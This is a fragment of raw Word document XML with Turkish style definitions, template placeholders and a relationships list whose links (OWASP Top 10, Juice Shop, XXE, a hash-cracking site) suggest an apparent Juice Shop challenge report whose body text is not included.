      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:color w:val="53548A" w:themeColor="accent1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pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:i/>
      <w:color w:val="53548A" w:themeColor="accent1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pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:color w:val="313240" w:themeColor="text2" w:themeShade="BF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styleId="TabloKlavuzu">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="NormalTablo"/>
    <w:uiPriority w:val="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KonuBal">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="KonuBalChar"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:before="400"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="3E3E67" w:themeColor="accent1" w:themeShade="BF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Pr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="3E3E67" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="56"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Altyaz">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="AltyazChar"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="480"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:color w:val="424456" w:themeColor="text2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="AltyazChar">
    <w:name w:val="Altyazı Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Altyaz"/>
    <w:uiPriority w:val="11"/>
    <w:rPr>
      <w:i/>
      <w:color w:val="424456" w:themeColor="text2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="GlVurgulama">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
      <w:b/>
      <w:i/>
      <w:caps/>
      <w:color w:val="438086"/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk1Char">
    <w:name w:val="Başlık 1 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk1"/>
    <w:uiPriority w:val="9"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk2Char">
    <w:name w:val="Başlık 2 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk2"/>
    <w:uiPriority w:val="9"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk3Char">
    <w:name w:val="Başlık 3 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk3"/>
    <w:uiPriority w:val="9"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk4Char">
    <w:name w:val="Başlık 4 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk4"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:i/>
      <w:color w:val="438086" w:themeColor="accent2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk5Char">
    <w:name w:val="Başlık 5 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk5"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:color w:val="325F64" w:themeColor="accent2" w:themeShade="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk6Char">
    <w:name w:val="Başlık 6 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk6"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:i/>
      <w:color w:val="325F64" w:themeColor="accent2" w:themeShade="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk7Char">
    <w:name w:val="Başlık 7 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk7"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:color w:val="53548A" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk8Char">
    <w:name w:val="Başlık 8 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk8"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:i/>
      <w:color w:val="53548A" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk9Char">
    <w:name w:val="Başlık 9 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk9"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:color w:val="313240" w:themeColor="text2" w:themeShade="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Gl">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="bekMetni">
    <w:name w:val="Block Text"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="3"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="2" w:space="10" w:color="53548A" w:themeColor="accent1"/>
        <w:left w:val="single" w:sz="2" w:space="10" w:color="53548A" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="2" w:space="10" w:color="53548A" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="2" w:space="10" w:color="53548A" w:themeColor="accent1"/>
        <w:between w:val="single" w:sz="2" w:space="10" w:color="53548A" w:themeColor="accent1"/>
        <w:bar w:val="single" w:sz="2" w:color="53548A" w:themeColor="accent1"/>
      </w:pBdr>
      <w:ind w:left="1152" w:right="1152"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="53548A" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HafifVurgulama">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="19"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
      <w:i/>
      <w:color w:val="006666"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="GlBavuru">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="32"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cs="Times New Roman"/>
      <w:b/>
      <w:i/>
      <w:caps/>
      <w:color w:val="4E4F89"/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HafifBavuru">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
      <w:i/>
      <w:color w:val="4E4F89"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Vurgu">
    <w:name w:val="Emphasis"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
      <w:b/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="KitapBal">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:i/>
      <w:color w:val="000000"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="stBilgi">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="stBilgi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stBilgiChar">
    <w:name w:val="Üst Bilgi Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="stBilgi"/>
    <w:uiPriority w:val="99"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="AltBilgi">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="AltBilgi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AltBilgiChar">
    <w:name w:val="Alt Bilgi Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="AltBilgi"/>
    <w:uiPriority w:val="99"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalGirinti">
    <w:name w:val="Normal Indent"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="GlAlnt">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="threeDEngrave" w:sz="6" w:space="10" w:color="438086" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="4" w:space="10" w:color="438086" w:themeColor="accent2"/>
      </w:pBdr>
      <w:spacing w:before="360" w:after="360" w:line="324" w:lineRule="auto"/>
      <w:ind w:left="1080" w:right="1080"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="KentselMaddearetliListe">
    <w:name w:val="Kentsel Madde İşaretli Liste"/>
    <w:uiPriority w:val="99"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="17"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="KentselNumaralListe">
    <w:name w:val="Kentsel Numaralı Liste"/>
    <w:uiPriority w:val="99"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="22"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListeParagraf">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="36"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="AralkYok">
    <w:name w:val="No Spacing"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="YerTutucuMetni">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalonMetni">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalonMetni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Pr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Maddeareti1">
    <w:name w:val="Madde İşareti 1"/>
    <w:basedOn w:val="ListeParagraf"/>
    <w:uiPriority w:val="38"/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="38"/>
      </w:numPr>
      <w:spacing w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Maddeareti2">
    <w:name w:val="Madde İşareti 2"/>
    <w:basedOn w:val="ListeParagraf"/>
    <w:uiPriority w:val="38"/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="38"/>
      </w:numPr>
      <w:spacing w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Maddeareti3">
    <w:name w:val="Madde İşareti 3"/>
    <w:basedOn w:val="ListeParagraf"/>
    <w:uiPriority w:val="38"/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="38"/>
      </w:numPr>
      <w:spacing w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="VarsaylanYerTutucuKonu10">
    <w:name w:val="VarsayılanYerTutucu_Konu10"/>
    <w:uiPriority w:val="39"/>
    <w:rPr>
      <w:i/>
      <w:color w:val="424456" w:themeColor="text2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="stbilgiift">
    <w:name w:val="Üstbilgi Çift"/>
    <w:basedOn w:val="stBilgi"/>
    <w:uiPriority w:val="39"/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
      </w:pBdr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="stbilgiTek">
    <w:name w:val="Üstbilgi Tek"/>
    <w:basedOn w:val="stBilgi"/>
    <w:uiPriority w:val="39"/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:jc w:val="right"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Kategori">
    <w:name w:val="Kategori"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:qFormat/>
    <w:pPr>
      <w:framePr w:hSpace="187" w:wrap="around" w:hAnchor="margin" w:xAlign="center" w:y="721"/>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cstheme="minorBidi"/>
      <w:caps/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Aklamalar">
    <w:name w:val="Açıklamalar"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="120" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="AklamaMetni1">
    <w:name w:val="Açıklama Metni1"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="120" w:line="288" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Kpr">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rPr>
      <w:color w:val="67AFBD" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="T1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="T2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:ind w:left="240"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="T3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="400"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ResimYazs">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="53548A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009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68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5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90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74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85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90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67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04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48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42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11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42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6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93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01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11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41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12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0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401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5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00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22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04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90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47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20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68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67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86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6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44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34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31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84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01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24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73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64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67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21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69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8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9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06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10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85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20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77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68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21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46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21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5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45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09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5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1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60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1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24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0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82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85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6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29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39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6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06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52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20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15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7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66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91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9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98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45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33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15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6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40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1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23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98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85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79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08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93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9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hashkiller.co.uk/Cracker" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20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header" Target="header2.xml"/><Relationship Id="rId55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6.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf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hyperlink" Target="https://www.wikizeroo.org/index.php?q=aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvSmFtZXNfVC5fS2lyaw" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://futurama.fandom.com/wiki/Suicide_booth" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.png"/><Relationship Id="rId53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hyperlink" Target="https://hashkiller.co.uk/Cracker" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cryptii.com/pipes/z85-encoder" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image26.png"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="foot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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer1.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item3.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/bkimminich/juice-shop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hyperlink" Target="https://futurama.fandom.com/wiki/Bender_Bending_Rodr%C3%ADguez" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" TargetMode="External"/><Relationship Id="rId54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49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msa\AppData\Roaming\Microsoft\&#350;ablonlar\Rapor%20(&#350;ehir%20Hayat&#305;%20temas&#305;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80F3F796259414FAC801F41ECA0027B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88A08D58-583E-4DE2-93A7-74F915E296D3}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00ED090B" w:rsidRDefault="004F5504">
          <w:pPr>
            <w:pStyle w:val="580F3F796259414FAC801F41ECA0027B"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:color w:val="44546A" w:themeColor="text2"/>
            </w:rPr>
            <w:t>[Tarihi seçin]</w:t>
          </w:r>
        </w:p>
      </w:docPartBody>
    </w:docPart>
    <w:docPart>
      <w:docPartPr>
        <w:name w:val="D8E4383E5E1245EAB6C8C714FFEACEEC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3D521587-76CC-4A1C-8C6D-624330CB0059}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00ED090B" w:rsidRDefault="004F5504">
          <w:pPr>
            <w:pStyle w:val="D8E4383E5E1245EAB6C8C714FFEACEEC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72"/>
              <w:szCs w:val="72"/>
            </w:rPr>
            <w:t>[Belge başlığını yazın]</w:t>
          </w:r>
        </w:p>
      </w:docPartBody>
    </w:docPart>
    <w:docPart>
      <w:docPartPr>
        <w:name w:val="2CA848442B984E49B7C3F6BD29A9AEA2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F7A315AA-3798-4241-9D3A-8BDD9E2E59FF}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00ED090B" w:rsidRDefault="004F5504">
          <w:pPr>
            <w:pStyle w:val="2CA848442B984E49B7C3F6BD29A9AEA2"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:i/>
              <w:iCs/>
              <w:color w:val="44546A" w:themeColor="text2"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
            <w:t>[Belge alt başlığını yazın]</w:t>
          </w:r>
        </w:p>
      </w:docPartBody>
    </w:docPart>
    <w:docPart>
      <w:docPartPr>
        <w:name w:val="B5C07757C45C49DD9A1219EB6D24B3CF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269F77C5-2104-4F95-A22F-AA751832115C}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00ED090B" w:rsidRDefault="004F5504">
          <w:pPr>
            <w:pStyle w:val="B5C07757C45C49DD9A1219EB6D24B3CF"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:color w:val="44546A" w:themeColor="text2"/>
            </w:rPr>
            <w:t>[Yazar adını yazın]</w:t>
          </w:r>
        </w:p>
      </w:docPartBody>
    </w:docPart>
    <w:docPart>
      <w:docPartPr>
        <w:name w:val="C504DB3BDF6E4C90A23E7E88D7DA8DAE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018FB068-60EC-4089-8C99-5735595573B5}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00ED090B" w:rsidRDefault="004F5504">
          <w:pPr>
            <w:pStyle w:val="C504DB3BDF6E4C90A23E7E88D7DA8DAE"/>
          </w:pPr>
          <w:r>
            <w:t>[Belge başlığını yazın]</w:t>
          </w:r>
        </w:p>
      </w:docPartBody>
    </w:docPart>
    <w:docPart>
      <w:docPartPr>
        <w:name w:val="4D883651C68B425BA766D5D2A6C75F70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1F918183-1C2B-417B-B8A9-0040C7458598}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00ED090B" w:rsidRDefault="004F5504">
          <w:pPr>
            <w:pStyle w:val="4D883651C68B425BA766D5D2A6C75F70"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:color w:val="5B9BD5" w:themeColor="accent1"/>
            </w:rPr>
            <w:t>[Belge alt başlığını yazın]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A2"/>
    <w:family w:val="roman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A2"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="00000687" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="0000009F" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="HGMinchoB">
    <w:charset w:val="80"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="80000281" w:usb1="28C76CF8" w:usb2="00000010" w:usb3="00000000" w:csb0="00020000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HGGothicM">
    <w:charset w:val="80"/>
    <w:family w:val="modern"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="80000281" w:usb1="28C76CF8" w:usb2="00000010" w:usb3="00000000" w:csb0="0002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4C7D"/>
    <w:rsid w:val="004F5504"/>
    <w:rsid w:val="007327CD"/>
    <w:rsid w:val="008A7930"/>
    <w:rsid w:val="00C2040E"/>
    <w:rsid w:val="00ED090B"/>
    <w:rsid w:val="00FC4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1"/>
    <w:qFormat/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="2" w:color="438086"/>
      </w:pBdr>
      <w:spacing w:before="360" w:after="80" w:line="276" w:lineRule="auto"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="minorHAnsi"/>
      <w:color w:val="ED7D31" w:themeColor="accent2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2"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="0" w:line="276" w:lineRule="auto"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="minorHAnsi"/>
      <w:color w:val="ED7D31" w:themeColor="accent2"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Balk3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Balk3Char"/>
    <w:uiPriority w:val="2"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="0" w:line="276" w:lineRule="auto"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
